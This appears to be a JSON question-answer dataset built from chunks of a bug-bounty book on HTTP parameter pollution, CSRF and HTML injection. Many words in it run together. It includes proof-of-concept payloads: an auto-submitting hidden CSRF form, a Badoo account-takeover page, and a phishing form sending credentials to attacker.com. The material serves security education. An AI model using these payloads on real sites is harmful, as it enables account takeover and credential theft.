user.account value 12345, but would actually\nreference the attacker-passed value ABCDEF.\nClient-Side HPP\nOntheotherhand,HPPclient-sidevulnerabilitiesinvolvetheabilitytoinjectparameters\ninto a URL, which are subsequently reflected back on the page to the user.\nLucaCarettoniandStefanodiPaola,tworesearcherswhopresentedonthisvulnerability\ntype in 2009, included an example of this behavior in their presentation using the\ntheoretical URL http://host/page.php?par=123%26action=edit and the following server-side\ncode:\n<?$val=htmlspecialchars($_GET['par'],ENT_QUOTES);?>\n<ahref=\"/page.php?action=view&par='.<?=$val?>.'\">ViewMe!</a>\nHere,thecodegeneratesanewURLbasedontheuser-enteredURL.ThegeneratedURL\nincludes an action parameter and a par parameter, the second of which is determined\nbytheuser’sURL.InthetheoreticalURL,anattackerpassesthevalue123%26action=edit\nas the value for par in the URL. %26 is the URL encoded value for &, which means that\nwhen the URL is parsed, the %26 is interpreted as &. This adds an additional parameter\nHTTPParameterPollution 21\nto the generated href link without adding an explicit action parameter. Had they used\n123&action=edit instead, this would have been interpreted as two separate parameters\nso par would equal 123 and the parameter action would equal edit. But since the site\nisonlylookingforandusingtheparameterparinitscodetogeneratethenewURL,the\naction parameter would be dropped. In order to work around this, the %26 is used so\nthat action isn’t initially recognized as a separate parameter, so par’s value becomes\n123%26action=edit.\nNow,par(withtheencoded&as%26)wouldbepassedtothefunctionhtmlspecialchars.\nThis function converts special characters, such as %26 to their HTML encoded values\nresulting in %26 becoming &. The converted value is then stored in $val. Then, a new\nlink is generated by appending $val to the href value at. So the generated link becomes:\n<ahref=\"/page.php?action=view&par=123&amp;action=edit\">\nIn doing so, an attacker has managed to add the additional action=edit to the href URL,\nwhich could lead to a vulnerability depending on how the server handles receiving two\naction parameters.\nExamples\n1. HackerOne Social Sharing Buttons\nDifficulty: Low\nUrl: https://hackerone.com/blog/introducing-signal-and-impact\nReport Link: https://hackerone.com/reports/1059531\nDate Reported: December 18, 2015\nBounty Paid: $500\nDescription:\nHackerOne blog posts include links to share content on popular social media sites like\nTwitter, Facebook, and so on. These links will create content for the user to post on\nsocialmediathatlinkbacktotheoriginalblogpost.Thelinkstocreatethepostsinclude\nparameters that redirect to the blog post link when another user clicks the shared post.\nA vulnerability was discovered where a hacker could tack on another URL parameter\nwhen visiting a blog post, which would be reflected in the shared social media link,\ntherebyresultinginthesharedpostlinkingtosomewhereotherthantheintendedblog.\nThe example used in the vulnerability report involved visiting the URL:\nhttps://hackerone.com/blog/introducing-signal\n1https://hackerone.com/reports/105953\nHTTPParameterPollution 22\nand then adding\n&u=https://vk.com/durov\nto the end of it. On the blog page, when a link to share on Facebook was rendered by\nHackerOne the link would become:\nhttps://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov\nIfthismaliciouslyupdatedlinkwereclickedbyHackerOnevisitorstryingtosharecontent\nthroughthesocialmedialinks,thelastuparameterwouldbegivenprecedenceoverthe\nfirst and subsequently used in the Facebook post. This would lead to Facebook users\nclicking the link and being directed to https://vk.com/durov instead of HackerOne.\nAdditionally, when posting to Twitter, HackerOne included default Tweet text which\nwould promote the post. This could also be manipulated by including &text= in the url:\nhttps://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov&text=another_site:https://vk.com/durov\nOnceauserclickedthislink,theywouldgetaTweetpopupwhichhadthetextanother_-\nsite: https://vk.com/durov instead of text which promoted the HackerOne blog.\nTakeaways\nBe on the lookout for opportunities when websites accept content and appear\ntobecontactinganotherwebservice,likesocialmediasites,andrelyingonthe\ncurrentURLtogeneratethelinktocreateasharedpost.\nIn these situations, it may be possible that submitted content is being passed\non without undergoing proper security checks, which could lead to parameter\npollutionvulnerabilities.\n2. Twitter Unsubscribe Notifications\nDifficulty: Low\nUrl: twitter.com\nReport Link: blog.mert.ninja/twitter-hpp-vulnerability2\nDate Reported: August 23, 2015\nBounty Paid: $700\nDescription:\nIn August 2015, hacker Mert Tasci noticed an interesting URL when unsubscribing from\nreceiving Twitter notifications:\n2http://blog.mert.ninja/blog/twitter-hpp-vulnerability\nHTTPParameterPollution 23\nhttps://twitter.com/i/u?iid=F6542&uid=1134885524&nid=22+26\n(I’veshortenedthisabitforthebook).DidyounoticetheparameterUID?Thishappens\nto be your Twitter account user ID. Noticing that, he did what I assume most of us\nhackers would do, he tried changing the UID to that of another user and￿nothing.\nTwitter returned an error.\nDetermined to continue where others may have given up, Mert tried adding a second\nUID parameter so the URL looked like (again I shortened this):\nhttps://twitter.com/i/u?iid=F6542&uid=2321301342&uid=1134885524&nid=22+26\nAnd￿SUCCESS!Hemanagedtounsubscribeanotheruserfromtheiremailnotifications.\nTurns out, Twitter was vulnerable to HPP unsubscribing users.\nTakeaways\nThough a short description, Mert’s efforts demonstrate the importance of per-\nsistence and knowledge. If he had walked away from the vulnerability after\nchanging the UID to another user’s and failing or had he not know about HPP-\ntypevulnerabilities,hewouldn’thavereceivedhis$700bounty.\nAlso,keepaneyeoutforparameters,likeUID,beingincludedinHTTPrequests\nas a lot of vulnerabilities involve manipulating parameter values to make web\napplicationsdoingunexpectedthings.\n3. Twitter Web Intents\nDifficulty: Low\nUrl: twitter.com\nReport Link: Parameter Tampering Attack on Twitter Web Intents3\nDate Reported: November 2015\nBounty Paid: Undisclosed\nDescription:\nTwitterWebIntentsprovidepop-upflowsforworkingwithTwitteruser’stweets,replies,\nretweets, likes, and follows in the context of non-Twitter sites. They make it possible for\nusers to interact with Twitter content without leaving the page or having to authorize a\nnew app just for the interaction. Here’s an example of what one of these pop-ups looks\nlike:\n3https://ericrafaloff.com/parameter-tampering-attack-on-twitter-web-intents\nHTTPParameterPollution 24\nTwitterIntent\nTesting this out, hacker Eric Rafaloff found that all four intent types, following a user,\nliking a tweet, retweeting, and tweeting, were vulnerable to HPP. Twitter would create\neach intent via a GET request with URL parameters like the following:\nhttps://twitter.com/intent/intentType?paramter_name=paramterValue\nThis URL would include intentType and one or more parameter name/value pairs, for\nexampleaTwitterusernameandTweetid.Twitterwouldusetheseparameterstocreate\nthepop-upintenttodisplaytheusertofollowortweettolike.Ericfoundthatifhecreated\na URL with two screen_name parameters for a follow intent, instead of the expected\nsingular screen_name, like:\nHTTPParameterPollution 25\nhttps://twitter.com/intent/follow?screen_name=twitter&screen_name=ericrtest3\nTwitter would handle the request by giving precedence to the second screen_name\nvalue ericrtest3 over the first twitter value when generating a follow button, so a user\nattempting to follow the Twitter’s official account could be tricked into following Eric’s\ntest account. Visiting the URL created by Eric would result in the following HTML form\nbeing generated by Twitter’s back-end code with the two screen_name parameters:\n<formclass=\"follow\"id=\"follow_btn_form\"action=\"/intent/follow?screen_name=eri\\\ncrtest3\"method=\"post\">\n<inputtype=\"hidden\"name=\"authenticity_token\"value=\"...\">\n<inputtype=\"hidden\"name=\"screen_name\"value=\"twitter\">\n<inputtype=\"hidden\"name=\"profile_id\"value=\"783214\">\n<buttonclass=\"button\"type=\"submit\">\n<b></b><strong>Follow</strong>\n</button>\n</form>\nTwitter would pull in the information from the first screen_name parameter, which is\nassociatedwiththeofficialTwitteraccountsothatavictimwouldseethecorrectprofile\nof the user they intended to follow, because the URL’s first screen_name parameter is\nused to populate the two input values. But, clicking the button, they’d end up following\nericrtest3becausetheactionintheformtagwouldinsteadusethesecondscreen_name\nparameter’s value in the action param of the form tag, passed to the original URL:\nhttps://twitter.com/intent/follow?screen_name=twitter&screen_name=ericrtest3\nSimilarly,whenpresentingintentsforliking,Ericfoundhecouldincludeascreen_name\nparameterdespiteithavingnorelevancetolikingthetweet.Forexample,hecouldcreate\nthe URL:\nhttps://twitter.com/intent/like?tweet_id=6616252302978211845&screen_name=ericrtest3\nAnormallikeintentwouldonlyneedthetweet_idparameter,however,Ericinjectedthe\nscreen_nameparametertotheendoftheURL.Likingthistweetwouldresultinavictim\nbeing presented with the correct owner profile to like the Tweet, but the follow button\npresented alongside the correct Tweet and the correct profile of the tweeter would be\nfor the unrelated user ericrtest3.\nTakeaways\nThis is similar to the previous UID Twitter vulnerability. Unsurprisingly, when a\nsite is vulnerable to a flaw like HPP, it may be indicative of a broader systemic\nissue. Sometimes if you find a vulnerability like this, it’s worth taking the time\nto explore the platform in its entirety to see if there are other areas where you\nmightbeabletoexploitsimilarbehavior."
  },
  {
    "input": "What is the main factor that determines the risk posed by HTTP Parameter Pollution?",
    "summary": "HTTPParameterPollution (HPP) is a vulnerability that depends on how a website's back-end processes polluted parameters. Since the back-end actions are often unknown, discovering HPP requires experimentation rather than just analysis. Testing social media links can be a starting point, but thorough exploration is needed to identify HPP issues, especially when dealing with parameter substitutions such as UIDs.",
    "output": "HTTPParameterPollution 26\nSummary\nTheriskposedbyHTTPParameterPollutionisreallydependentontheactionsperformed\nby a site’s back-end and where the polluted parameters are being used.\nDiscovering these types of vulnerabilities really depends on experimentation more so\nthanothervulnerabilitiesbecausetheback-endactionsofawebsitemaybeablackbox\ntoahacker,whichmeansthat,you’llprobablyhaveverylittleinsightintowhatactionsa\nback-end server takes after receiving your input.\nThroughtrialanderror,youmaybeabletodiscoversituationsthesetypesofvulnerabil-\nities. Social media links are usually a good first step but remember to keep digging and\nthink of HPP when you might be testing for parameter substitutions like UIDs."
  },
  {
    "input": "What is a cross-site request forgery (CSRF) attack and how can it be mitigated?",
    "summary": "Cross-Site Request Forgery (CSRF) occurs when an attacker tricks a user into performing an action on a website they are already authenticated to, without the user's knowledge. This is often done by exploiting cookies, which can be sent automatically with HTTP requests. To prevent CSRF, common defenses include using CSRF tokens, implementing CORS policies, and validating the origin of HTTP requests. Examples of CSRF vulnerabilities include a Shopify Twitter disconnect and an Instacart zone change, where attackers could manipulate user data without interaction.",
    "output": "6. Cross-Site Request Forgery\nDescription\nA cross-site request forgery, or CSRF, attack occurs when an attacker can use an HTTP\nrequesttoaccessauser’sinformationfromanotherwebsite,andusethatinformationto\nactontheuser’sbehalf.Thistypicallyreliesonthevictimbeingpreviouslyauthenticated\non the target website where the action is submitted, and occurs without the victim\nknowing the attack has happened. Here’s a basic example, which we’ll walk through:\n1. Bob logs into his banking website to check his balance.\n2. Having finished, Bob checks his Gmail account by visiting https://gmail.com/.\n3. Bob has an email with a link to an unfamiliar website and clicks the link to see\nwhere it leads.\n4. Whenloaded,theunfamiliarsiteinstructsBob’sbrowsertomakeanHTTPrequest\ntoBob’sbankingwebsite,whichtransfersmoneyfromhisaccounttotheattacker’s.\n5. Bob’s banking website receives the HTTP request from the unfamiliar (and mali-\ncious) website, doesn’t have any CSRF protections, and so, processes the transfer.\nCookies\nNow, before we jump into detail about how Bob was compromised, we need to talk\nabout cookies. When you visit a website that requires authentication, like a username\nand password, that site will typically store a cookie in your browser. Cookies are files\ncreated by websites that are stored on the user’s computer.\nCookiescanbeusedforvariouspurposessuchasforstoringinformationlikeuserpref-\nerences or the user’s history of visiting a website. To store this information, cookies can\nhave some attributes, which are standardized pieces of information that tell browsers\nabout the cookies and how they should be treated. Some attributes that a cookie could\nhave include the domain, expiry date, secure, and httponly attributes.\nIn addition to attributes, cookies can contain name/value pairs, which are made up of\nan identifier and an associated value to be passed to a website (the site to pass this\ninformationtoisdefinedbythecookie’sdomainattribute).Asitecansetanynumberof\ncookies,eachwiththeirownpurpose.Forexample,asitecoulduseasession_idcookieto\nremember who a user is rather than have them enter their username and password for\neverypagetheyvisitoractiontheyperform.RememberthatHTTPisconsideredstateless\nCross-SiteRequestForgery 28\nmeaning that with every HTTP request, a website doesn’t know who a user is, so it has\nto re-authenticate them for every request.\nSo,asanexample,aname/valuepairinacookiecouldbesessionId:123456789andthe\ncookie could have a domain of .site.com. This means that the user_id cookie should be\nsent to every .site.com site a user visits, like foo.site.com, bar.site.com, www.site.com,\nand so on.\nThesecureandhttponlyattributestellbrowserswhenandhowcookiescanbesentand\nread.Theseattributesdon’tcontainvalues,butinsteadactasflagsthatareeitherpresent\ninthecookieorarenot.Whenacookiecontainsthesecureattribute,browserswillonly\nsendthatcookiewhenvisitingHTTPSsites.Ifyouvisitedhttp://www.site.com/withasecure\ncookie,yourbrowserwouldn’tsendyourcookiestothesite.Thisistoprotectyourprivacy\nsince HTTPS connections are encrypted and HTTP ones are not. The httponly attribute\ntells the browser that the cookie can only be read through HTTP and HTTPS requests.\nThis will become important when we discuss cross-site scripting in a later chapter, but\nfor now, know that if a cookie is httponly, browsers won’t allow any scripting languages,\nsuchasJavaScript,toreaditsvalue.Acookiewithoutthesecureattributecanbesentto\nanon-HTTPSsiteand,likewise,acookiewithouthttponlysetcanbereadbyanon-HTTP\nconnection.\nLastly,theexpirydatesimplyinformsthebrowserofwhenthesitewillnolongerconsider\nthe cookie to be valid, so the browser should destroy it.\nTaking this all back to Bob, when he visits his banking site and logs in, the bank will\nrespondtohisHTTPrequestwithanHTTPresponse,whichincludesacookieidentifying\nBob. In turn, Bob’s browser will automatically send that cookie with all other HTTP\nrequests to the banking website.\nAfterfinishinghisbanking,Bobdoesn’tlogoutwhenhedecidestovisithttps://www.gmail.com/.\nThisisimportantbecausewhenyoulogoutofasite,thatsitewilltypicallysendanHTTP\nresponse that expires your cookie. As a result, when you revisit the site, you’ll have to\nlog in again.\nWhenBobvisitstheunknownsite,heisinadvertentlyvisitingamaliciouswebsite,which\nisdesignedtoattackhisbankingwebsite.Atthispoint,thewaythemalicioussiteexploits\nthe banking site depends on whether the bank accepts GET or POST requests.\nCSRF with GET Requests\nIf the banking site accepts GET requests, the malicious site will send the HTTP request\nwith a hidden form or an <img> tag. Since the hidden form technique can be used with\nPOST requests as well, we’ll cover the <img> tag in this section and forms in the “CSRF\nwith POST Requests” section later.\nWhen an <img> tag is rendered by a browser, it will make an HTTP GET request to the\nsrc attribute in the tag. So, if the malicious site were to use a URL that transferred $500\nfrom Bob to Joe that looked like:\nCross-SiteRequestForgery 29\nhttps://www.bank.com/transfer?from=bob&to=joe&amount=500\nthen a malicious image tag would use this URL as its source value, like in the following\ntag:\n<imgsrc=\"https://www.bank.com/transfer?from=bob&to=joe&amount=500\">\nAsaresult,whenBobvisitstheattacker-ownedsite,itincludesthe<img>taginitsHTTP\nresponse and the browser then makes the HTTP GET request to the bank. The browser\nsendsBob’sauthenticationcookiestogetwhatitthinksshouldbeanimagewheninfact\nthebankreceivestherequest,processestheURLinthetag’ssrcattribute,andprocesses\nthe transfer.\nFor this reason, as a general web programming principle, HTTP GET requests should\nnever perform any back-end data modifying requests, like transferring money.\nCSRF with POST Requests\nIn contrast, if the bank accepts POST requests, there are a couple of things to consider.\nThe contents of a POST request can complicate a CSRF attack, so different techniques\nneed to be used to successfully pull off an attack.\nThe most simplistic situation involves a POST request with the content-type applica-\ntion/x-www-form-urlencoded or text/plain. The content-type is a header that browsers\nmayincludewhensendingHTTPrequests.IttellstherecipienthowthebodyoftheHTTP\nrequest is encoded. Here’s an example of a text/plain content-type request:\nPOST/HTTP/1.1\nHost:www.google.ca\nUser-Agent:Mozilla/5.0(WindowsNT6.1;rv:50.0)Gecko/20100101Firefox/50.0\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Length:0\nContent-Type:text/plain;charset=UTF-8\nDNT:1\nConnection:close\nThecontent-typeislabeledanditstypeislistedalongwiththecharacterencodingofthe\nrequest. The content-type is important because browsers treat types differently (which\nwe’ll get to in a second). Now, in this situation, it’s possible for a malicious site to create\na hidden HTML form and submit it silently to the target site without a victim knowing.\nThe form can be used to submit a POST or GET request to a URL and can even submit\nparameters values. Here’s an example of some malicious code:\nCross-SiteRequestForgery 30\n<iframestyle=\"display:none\"name=\"csrf-frame\"></iframe>\n<formmethod='POST'action='http://bank.com/transfer.php'target=\"csrf-frame\"id\\\n=\"csrf-form\">\n<inputtype='hidden'name='from'value='Bob'>\n<inputtype='hidden'name='to'value='Joe'>\n<inputtype='hidden'name='amount'value='500'>\n<inputtype='submit'value='submit'>\n</form>\n<script>document.getElementById(\"csrf-form\").submit()</script>\nHere, we’re making an HTTP POST request to Bob’s bank with a form (this is denoted\nby the target attribute in the <form> tag). Since the attacker doesn’t want Bob to see the\nform,eachofthe<input>elementsaregiventhetype‘hidden’whichmakestheminvisible\nonthewebpageBobsees.Asthefinalstep,theattackerincludessomeJavaScriptinside\na <script> tag to automatically submit the form when the page is loaded.\nTheJavaScriptdoesthisbycallingthegetElementByID()methodontheHTMLdocument\nwith the id of the form (“csrf-form”) that we set in the <form>. Like with a GET request,\nonce the form is submitted, the browser makes the HTTP POST request to send Bob’s\ncookies to the bank site, which invokes a transfer. Since POST requests send an HTTP\nresponse back for the browser, the attacker hides the response in an <iframe> with the\ndisplay:none attribute so Bob doesn’t see it and realize what has happened.\nIn other scenarios, a site might expect the POST request to be submitted with the con-\ntent-type application/json instead. In some cases, a request that is an application/json\ntype will have a CSRF token, which is a value that is submitted with the HTTP request\nso that the target site can validate that the request originated from itself and not from\nanother, malicious site. Sometimes the token is included in the HTTP body of the POST\nrequest and, at other times, is a header like the content-type.\nSending POST requests as application/json are significant because browsers will first\nsend an OPTIONS HTTP request before the POST request is sent. The site then returns\na response to the OPTIONS call indicating which types of HTTP requests it accepts.\nThe browser reads this response and then makes the actual POST HTTP request, which\nin our example, would be the transfer. This work flow actually protects against some\nCSRF vulnerabilities because the malicious website won’t be allowed to read the HTTP\nOPTIONS response from the target website to know if it can send the malicious POST\nrequest. This is called cross origin resource sharing (CORS).\nCORS is designed to restrict accessing resources, including json responses, from a\ndomain outside of that which served the file, or is allowed by the target site. In other\nwords,whenCORSisusedtoprotectasite,youcan’tsubmitanapplication/jsonrequest\ntocallthetargetapplication,readtheresponseandmakeanothercall,unlessthetarget\nsite allows it. In some situations, you’ll be able to work around CORS to perform a CSRF\nattack, as we’ll see later in this chapter.\nCross-SiteRequestForgery 31\nNow, as mentioned, CSRF vulnerabilities can be mitigated in a number of ways so it’s\nimportant to ensure a proper proof of concept attack before reporting them.\nDefenses Against CSRF Attacks\nThe most popular protection against CSRF is likely the CSRF token, which would be\nrequired by the protected site when submitting potentially data altering requests (that\nis,POSTrequests).Here,awebapplication(likeBob’sbank)wouldgenerateatokenwith\ntwo parts, one which Bob would receive and one which the application would retain.\nWhenBobattemptstomaketransferrequests,hewouldhavetosubmithistoken,which\nthe bank would then validate with its side of the token.\nThese tokens aren’t always obviously named, but some potential examples of names\ninclude X-CSRF-TOKEN, lia-token, rt, or form-id. The attacker wouldn’t be able to suc-\ncessfully submit a POST request without a valid token, and so wouldn’t be able to carry\nout a CSRF attack, however there CSRF tokens don’t always lead to a dead end when\nsearching for vulnerabilities to exploit.\nThe obvious other way sites protect themselves is by using CORS though this isn’t fool\nproof as it relies on the security of browsers, ensuring proper CORS configurations\nwhen sites are allowed to access responses and there have been some CORS by-pass\nvulnerabilities to this in the past. Additionally, CORS sometimes can be bypassed by\nchangingthecontent-typefromapplication/jsontoapplication/x-www-form-urlencoded\nor by using a GET request instead of a POST request. Both of these depend on how the\ntarget site is configured.\nLastly, CSRF vulnerabilities can also be avoided if a site validates the origin header\nsubmitted with an HTTP request, as the origin can’t be attacker-controlled and refers\nto the location where the request originated.\nExamples\n1. Shopify Twitter Disconnect\nDifficulty: Low\nUrl: https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect\nReport Link: https://hackerone.com/reports/1112161\nDate Reported: January 17, 2016\nBounty Paid: $500\nDescription:\n1https://hackerone.com/reports/111216\nCross-SiteRequestForgery 32\nShopify provides integration with Twitter to allow shop owners to tweet about their\nproducts. Similarly, it also provides functionality to disconnect a Twitter account from\na connected shop. The URL to disconnect a Twitter account is:\nhttps://www.twitter-commerce.shopifyapps.com/auth/twitter/disconnect/\nAs it turns out, when originally implemented, Shopify wasn’t validating the legitimacy of\nthe GET requests sent to it, making the URL vulnerable to CSRF.\nGET/auth/twitter/disconnectHTTP/1.1\nHost:twitter-commerce.shopifyapps.com\nUser-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.11;rv:43.0)Gecko/2010010\\\n1Firefox/43.0\nAccept:text/html,application/xhtml+xml,application/xml\nAccept-Language:en-US,en;q=0.5\nAccept-Encoding:gzip,deflate\nReferer:https://twitter-commerce.shopifyapps.com/account\nCookie:_twitter-commerce_session=REDACTED\nConnection:keep-alive\nThe hacker WeSecureApp, who filed the report, provided the following example of a\nvulnerablerequest—notetheuseofan<img>tagwhichmakesthecalltothevulnerable\nURL:\n<html>\n<body>\n<imgsrc=\"https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect\">\n</body>\n</html>\nTakeaways\nInthissituation,thevulnerabilitycouldhavebeenfoundbyusingaproxyserver,\nlike Burp or OWASP’s ZAP, to monitor the HTTP requests being sent to Shopify\nand noting that this was a GET request. GET requests should never modify any\ndata on the server, but WeSecureApp was able to take destructive action with\none,soyoushouldalsolookintothesetypesofrequestsaswell.\n2. Change Users Instacart Zones\nDifficulty: Low\nCross-SiteRequestForgery 33\nUrl: https://admin.instacart.com/api/v2/zones/\nReport Link: https://hackerone.com/reports/1579932\nDate Reported: August 9, 2015\nBounty Paid: $100\nDescription:\nInstacart is a grocery delivery app with an interface for its couriers. It allows its grocery\ndelivery users to define the zones that they work in, which can also be updated with a\nPOST request to the Instacart admin API’s /api/v2/zones endpoint. A hacker discovered\nthatthisendpointwasvulnerableCSRFandcouldbeusedtomodifyvictim’szone.Here’s\nsome example code to modify a victim’s zone:\n<html>\n<body>\n<formaction=\"https://admin.instacart.com/api/v2/zones\"method=\"POST\">\n<inputtype=\"hidden\"name=\"zip\"value=\"10001\"/>\n<inputtype=\"hidden\"name=\"override\"value=\"true\"/>\n<inputtype=\"submit\"value=\"Submitrequest\"/>\n</form>\n</body>\n</html>\nIn this example, the hacker created a form to access the API with a POST request. They\nthen used two hidden inputs—one to set the user’s new zone to the zip code 10001\nand one to set the API’s override parameter to true so that the user’s current zip value\nis replaced with the hacker submitted value. Finally, the hacker submitted the form to\nmake the POST request. This POC differs from our earlier as it would require a victim\nto click a button to submit the request since the hacker didn’t use an auto-submitting\nJavaScript function.\nAlthough this example still does the trick, it could be improved by using the techniques\ndescribed earlier, such as using a hidden iframe and auto-submitting the request on\nthe user’s behalf. This would demonstrate to the Instacart bug bounty triagers how an\nattacker could use this vulnerability without any victim action since vulnerabilities that\ndon’t require or limit victim interaction are potentially more impactful since less effort\nis required to exploit the vulnerability.\n2https://hackerone.com/reports/157993\nCross-SiteRequestForgery 34\nTakeaways\nWhen looking for exploits, broaden your attack scope and look beyond just\na site’s pages to include its API endpoints, which offer great potential for\nvulnerabilities. Occasionally, developers sometimes forget that API endpoints\ncanbediscoveredandexploitedsincetheyaren’treadilyavailablelikewebpages\n(forexample,mobileAPIendpointsrequireinterceptingyourphonetraffic).\n3. Badoo Full Account Takeover\nDifficulty: Medium\nUrl: https://badoo.com\nReport Link: https://hackerone.com/reports/1277033\nDate Reported: April 1, 2016\nBounty Paid: $852\nDescription:\nIf you visit and explore the social networking website https://www.badoo.com/, you’ll see\nthat they protect against CSRF vulnerabilities with a CSRF token. More specifically, they\nuse a URL parameter, rt, which is unique to each user, but only five digits long (at least\nat the time of writing). While I noticed this when Badoo’s bug bounty program went live\non HackerOne, I couldn’t find a way to exploit it. However, the hacker Mahmoud Jamal\ndid.\nRecognizing the rt parameter and its significance, he also noticed that the parameter\nwas returned in almost all JSON responses. Unfortunately this wasn’t helpful as CORS\nprotects Badoo from attackers reading those responses since they are encoded as\napplication/json content types, but, Mahmoud kept digging.\nMahmoud then found the following JavaScript file:\nhttps://eu1.badoo.com/worker-scope/chrome-service-worker.js\nInside that file, there was a variable url_stats that looked like:\nvarurl_stats='https://eu1.badoo.com/chrome-push-stats?ws=1&rt=<rt_param_value>';\nTheurl_statsvariablestoredaURLthatcontainedtheuser’suniquertvalueasaparameter\nwhen the user’s browser would access the JavaScript file. What was even better was\nthat, to obtain the user’s rt value, an attacker would just need the victim to visit a\nmalicious web page that would access the JavaScript file. The attacker could then use\nthertvaluetolinkanysocialmediaaccountwiththeuser’sBadooaccount,whichwould\ngivetheattackertheabilitytologintoandmodifythevictim’saccount.Here’stheHTML\n3https://hackerone.com/reports/127703\nCross-SiteRequestForgery 35\npage Mahmoud used to accomplished this (I’ve removed the code and state values for\nformatting purposes):\n<html>\n<head>\n<title>Badooaccounttakeover</title>\n<scriptsrc=https://eu1.badoo.com/worker-scope/chrome-service-worker.js?ws=1\\\n></script>\n</head>\n<body>\n<script>\nfunctiongetCSRFcode(str){\nreturnstr.split('=')[2];\n}\nwindow.onload=function(){\nvarcsrf_code=getCSRFcode(url_stats);\ncsrf_url='https://eu1.badoo.com/google/verify.phtml?code=CODE&authuser=\\\n3&session_state=STATE&prompt=none&rt='+csrf_code;\nwindow.location=csrf_url;\n};\n</script>\n</body>\n</html>\nWhen a victim loaded this page, it would load the Badoo JavaScript by referencing it\nas the src attribute in a script tag. Having loaded the script, the web page then calls the\nJavaScriptfunctionwindow.onloadwhichdefinesananonymousJavaScriptfunction.The\nonloadeventhandleriscalledbybrowserswhenawebpageloads,andsincethefunction\nMahmoud defined is stored in the window.onload handler, his function will always be\ncalled when the page is loaded.\nNext, Mahmoud created a csrf_code variable, and assigned it the return value of a\nfunction he called getCSRFcode. This function takes and splits a string into an array of\nstrings at each ‘=’ character. It then returns the value of the third member of the array.\nWhen the function parses the variable url_stats from Badoo’s vulnerable JavaScript file,\nit splits the string into the array value:\nhttps://eu1.badoo.com/chrome-push-stats?ws,1&rt,<rt_param_value>\nThen the function returns the third member of the array, which is the rt value so that\ncsrf_code now is equal to the rt value.\nOncehehastheCSRFtoken,Mahmoudcreatesthecsrf_urlvariable,whichstoresaURL\nto Badoo’s /google/verify.phtml web page, which links his own Google account with the\nvictim’sBadooaccount.Thispagerequiressomeparameters,whicharehardcodedinto"
  },
  {
    "input": "What is the method Mahmoud used to complete the account takeover in the CSRF vulnerability example?",
    "summary": "A CSRF vulnerability allows an attacker to perform actions on a user's behalf without their knowledge. Mahmoud discovered that the 'rt' parameter, used for CSRF protection, was being returned in JSON responses, making it accessible to attackers. He exploited this by redirecting the user to a page that linked their Badoo account to another Google account. Application frameworks often protect against CSRF in POST requests but not in GET requests, so be cautious of any GET calls that modify server-side data. Additionally, if a CSRF token is sent with a POST request, testing by changing or removing it can help verify if the server is properly validating it.",
    "output": "Cross-SiteRequestForgery 36\nthe URL string. We won’t cover in detail here as these are specific to Badoo, however,\nyou should take note of the final rt parameter which doesn’t have a hard coded value.\nInstead,csrf_codeisconcatenatedtotheendoftheURLstringsothatitispassedasthert\nparameter’svalue.MahmoudthenmakesanHTTPrequestbyinvokingwindow.location\nandassignsittocsrf_url,whichredirectsthevisitinguser’sbrowsertotheURLfromthe\ncsrf_url. The user’s browser then processes the /google/verify.phtml page and links the\nuser’s Badoo account to Mahmoud’s Google account, thereby completing the account\ntakeover.\nTakeaways\nWherethereissmoke,there’sfire.Here,Mahmoudnoticedthatthertparameter\nwasbeingreturnedindifferentlocations,inparticularJSONresponses.Because\nof that, he rightly guessed the rt might show up somewhere where it could be\naccessed by an attacker and exploited—which in this case was a JavaScript file.\nIf you feel like something is off, keep digging. Use a proxy and check all the\nresources that are being called when you visit a target site or application. You\nmayfindaninformationleakwithsensitivedata,suchasaCSRFtoken.\nAdditionally,thisisagreatexampleofgoingtheextramiletoprovideawesome\nproof of an exploit. Not only did Mahmoud find the vulnerability, but he also\nprovidedafullexampleofhowitcouldbeexploitedviahisHTML.\nSummary\nCSRF vulnerabilities represent another attack vector and may be executed without a\nvictim even knowing or actively performing an action. Finding CSRF vulnerabilities takes\nsome ingenuity and again, a desire to test everything.\nGenerally, application frameworks like Ruby on Rails are increasingly protecting web\nforms if the site is performing POST requests, however, this isn’t the case for GET\nrequests, so be sure to keep an eye out for any GET HTTP calls which change server-\nside user data (like DELETE actions). Lastly, if you see a site is sending a CSRF token with\na POST request, try changing the CSRF token value or removing it entirely to ensure the\nserver is validating its existence."
  },
  {
    "input": "What is the difference between HTML injection and cross-site scripting (XSS) vulnerabilities?",
    "summary": "HTML injection allows attackers to alter webpage content by improperly handling user input, potentially leading to phishing or unauthorized data submission. It differs from XSS in that it involves rendering HTML rather than JavaScript. Examples include Coinbase and HackerOne, where attackers could manipulate input to inject HTML and exploit vulnerabilities. CRLF injection involves inserting carriage return and line feed characters, which can lead to HTTP request smuggling or response splitting, allowing attackers to manipulate headers and execute malicious code. XSS vulnerabilities occur when user input is rendered without sanitization, enabling attackers to inject JavaScript and steal sensitive information. Template injection vulnerabilities arise when user input is used in templates without proper sanitization, potentially allowing remote code execution. Examples include Uber and Rails, where attackers could exploit template engines to run arbitrary code.",
    "output": "7. HTML Injection\nDescription\nHypertext Markup Language (HTML) injection is also sometimes referred to as virtual\ndefacement. This is really an attack made possible by a site allowing a malicious user to\ninjectHTMLintoitswebpage(s)bynothandlingauser’sinputproperly.Inotherwords,\nan HTML injection vulnerability is caused by receiving HTML, typically via some form\ninput,whichisthenrenderedasinputted,onthewebpage.Thisisseparateanddistinct\nfrom injecting Javascript, VBScript, etc. which can lead to Cross Site Scripting Attacks.\nSinceHTMListhelanguageusedtodefinethestructureofawebpage,ifanattackercan\ninject HTML, they can essentially change what a browser renders and a web page looks\nlike. Sometimes this could result in completely changing the look of a page or in other\ncases, creating HTML forms to trick users in hope they use the form to submit sensitive\ninformation (this is referred to as phishing). For example, if you could inject HTML, you\nmightbeabletoadda<form>tagtothepage,askingtheusertore-entertheirusername\nand password like:\n<formmethod='POST'action='http://attacker.com/capture.php'id=\"login-form\">\n<inputtype='text'name='username'value=''>\n<inputtype='password'name='password'value=''>\n<inputtype='submit'value='submit'>\n</form>\nHowever,whensubmittingthisform,theinformationisactuallysenttohttp://attacker.com\nvia an action attribute, which sends the information to an attacker’s web page.\nExamples\n1. Coinbase Comments\nDifficulty: Low\nUrl: coinbase.com/apps\nReport Link: 